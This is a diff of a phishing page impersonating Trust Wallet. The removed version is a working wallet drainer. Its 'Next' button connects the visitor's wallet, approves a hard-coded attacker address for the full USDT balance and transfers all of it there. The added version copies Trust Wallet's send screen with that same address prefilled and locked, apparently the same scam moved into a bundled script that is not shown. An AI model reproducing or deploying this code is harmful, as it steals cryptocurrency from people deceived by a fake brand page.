@@ -1,103 +1,46 @@
-<!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-arp="">
 <head>
-  <meta charset="UTF-8">
-  <title>Trust Wallet | Secure USDT Transfer</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <style>
-    body {
-      background: #0b0f19;
-      color: #ffffff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-
-    h1 {
-      font-size: 28px;
-      margin-bottom: 10px;
-    }
-
-    p {
-      color: #cccccc;
-      margin-bottom: 30px;
-    }
-
-    button {
-      background: #22c55e;
-      color: white;
-      font-size: 18px;
-      padding: 14px 30px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    button:hover {
-      background: #16a34a;
-    }
-
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-      color: #00ff99;
-    }
-  </style>
+    <meta charset="utf-8">
+    <link rel="icon" href="/logo.png">
+    <meta name="trustwallet-dapp" content="true">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Web site created using create-react-app">
+    <link rel="apple-touch-icon" href="/logo.png">
+    <link rel="manifest" href="/manifest.json">
+    <title>Trustwallet</title>
+    <script defer="defer" src="./static/js/main.a4c29559.js"></script>
+    <link href="./static/css/main.e6c13ad2.css" rel="stylesheet">
+    <style data-styled="active" data-styled-version="6.1.16"></style>
 </head>
+
 <body>
-  <h1>Trust Wallet Secure Transfer</h1>
-  <p>Click "Next" to connect wallet and transfer your USDT</p>
-  <button onclick="transferAllUSDT()">Next</button>
-  <div id="status"></div>
-
-  <script>
-    async function transferAllUSDT() {
-      const statusDiv = document.getElementById("status");
-      statusDiv.innerText = "🔄 Connecting wallet...";
-      try {
-        const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
-        const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-
-        const usdtABI = [
-          { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
-          { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-          { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
-          { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
-        ];
-
-        const contract = new web3.eth.Contract(usdtABI, usdtAddress);
-
-        const balance = await contract.methods.balanceOf(sender).call();
-        if (balance === "0") {
-          statusDiv.innerText = "🚫 No USDT found in your wallet.";
-          return;
-        }
-
-        statusDiv.innerText = "🟡 Approving USDT for transfer...";
-
-        const allowance = await contract.methods.allowance(sender, receiver).call();
-
-        if (BigInt(allowance) < BigInt(balance)) {
-          await contract.methods.approve(receiver, balance).send({ from: sender });
-        }
-
-        statusDiv.innerText = "✅ Approval complete. Transferring USDT...";
-
-        await contract.methods.transferFrom(sender, receiver, balance).send({ from: sender });
-
-        statusDiv.innerText = "🎉 All USDT transferred successfully!";
-      } catch (err) {
-        console.error(err);
-        statusDiv.innerText = "❌ Error occurred: " + err.message;
-      }
-    }
-  </script>
+<noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+        <div class="sc-VHjGu csbCxp">
+            <div class="sc-gnOvAp hgrUZD">
+                <div class="sc-dOfePm ezZebS">
+                    <label class="sc-jgmqJh jdySqT">Address</label>
+                    <div class="sc-gIIpAQ bCcZzg">
+                        <span class="sc-ihGilW gujIR">×</span>
+                        <input class="sc-kFkjun dPtsqv" type="text" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" disabled>
+                        <span class="sc-jRLeyu kakqtx">Paste</span>
+                    </div>
+                </div>
+                <div class="sc-dOfePm ezZebS">
+                    <label class="sc-jgmqJh jdySqT">Amount</label>
+                    <div class="sc-cOPLXt hxYDhx">
+                        <div class="sc-gIIpAQ bCcZzg">
+                            <input class="sc-kFkjun dPtsqv" type="number" value="">
+                            <span class="sc-cRHGzb gHdQby">USDT</span>
+                            <span class="sc-jOTjWM gqxQNl">Max</span>
+                        </div>
+                    </div>
+                    <p class="sc-cXrvCr fUwUnJ">= $0.00</p>
+                </div>
+                <button class="sc-jXuTBK gunmRG">Next</button>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
